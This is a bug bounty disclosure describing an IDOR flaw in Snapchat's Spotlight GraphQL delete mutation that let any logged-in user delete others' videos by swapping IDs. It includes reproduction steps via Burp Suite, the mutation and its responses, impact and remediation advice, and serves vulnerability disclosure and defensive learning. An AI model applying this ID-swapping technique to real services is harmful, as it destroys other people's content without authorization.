# Title: IDOR in Snapchat Spotlight Allows Unauthorized Deletion of Any User's Content

- **Platform**: Snapchat Bug Bounty
- **Program**: Snapchat (HackerOne)
- **Severity**: Critical
- **Date**: 8 March 2023 (publicly disclosed)
- **Researcher**: prickn9
- **Bounty**: $15,000
- **Report**: https://hackerone.com/reports/1819832

## Summary

An Insecure Direct Object Reference (IDOR) vulnerability was discovered in Snapchat's Spotlight feature. The GraphQL API endpoint for deleting Spotlight stories failed to verify that the authenticated user actually owned the content being deleted. By manipulating the video ID parameter, an attacker could delete any user's Spotlight content remotely, threatening Snapchat's creator economy.

## Technical Details

The vulnerability existed in the GraphQL mutation endpoint used to delete Spotlight stories. The backend correctly authenticated users (verified they were logged in) but failed to authorize the operation (verified they owned the specific content).

The endpoint accepted a `deleteStorySnaps` mutation with an array of video IDs. The server only checked:
- ✅ Is the user authenticated?
- ❌ Does this user own these specific videos?

By intercepting the delete request via Burp Suite and replacing the target video ID with any other user's video ID, an attacker could delete content they had no rights to.

The video IDs were easily obtainable from the sharing URL of any public Spotlight video, making exploitation straightforward.

## Steps to Reproduce

1. Log in to Snapchat Web at https://my.snapchat.com/myposts
2. Open Burp Suite and configure browser proxy
3. Post a Spotlight video and attempt to delete it
4. Capture the GraphQL mutation request
5. Observe the video ID parameter in the delete mutation
6. Replace the video ID with the ID from another user's Spotlight video
7. Forward the modified request
8. Observe that the target user's video is deleted

## Proof of Concept

The vulnerable GraphQL mutation was captured as follows:

```graphql
mutation DeleteStorySnaps($input: DeleteStorySnapsInput!) {
  deleteStorySnaps(input: $input) {
    ... on DeleteStorySnapsResult {
      storySnaps { snapId status }
    }
  }
}
```

With variables:

```json
{
  "input": {
    "storySnapIds": ["victim_video_id_here"]
  }
}
```

The backend responded with success:

```json
{
  "data": {
    "deleteStorySnaps": {
      "storySnaps": [
        { "snapId": "victim_video_id_here", "status": "DELETED" }
      ]
    }
  }
}
```

After Snapchat deployed the fix, the same request returned:

```json
{
  "errors": [{
    "message": "DeleteStorySnapsError: rpc error: code = PermissionDenied desc = unable to delete snap",
    "extensions": { "code": "DeleteStorySnapsError" }
  }]
}
```

## Impact

- Any attacker could delete any Snapchat user's Spotlight content
- High-profile creators could have their entire Spotlight catalog deleted
- Snapchat's revenue-generating Spotlight feature (competing with TikTok) was at risk
- Loss of user trust and potential legal liability for lost creator earnings
- The vulnerability directly threatened Snapchat's creator economy

## Remediation

- Implement server-side ownership verification before allowing deletion
- Ensure the GraphQL resolver checks `userId` against the content owner's ID
- Add audit logging for all delete operations
- Rate-limit deletion requests to prevent mass exploitation
- Conduct thorough authorization audits on all content-modification endpoints

## References

- https://hackerone.com/reports/1819832
- https://latesthackingnews.com/2023/03/08/snapchat-vulnerability-could-allow-deleting-users-content-spotlight/
- https://www.tabcut.com/blog/post/snapchat-hacked-15-000-bounty
- https://ai.plainenglish.io/the-15-000-idor-that-threatened-snapchats-creator-economy-379ac3fa6277
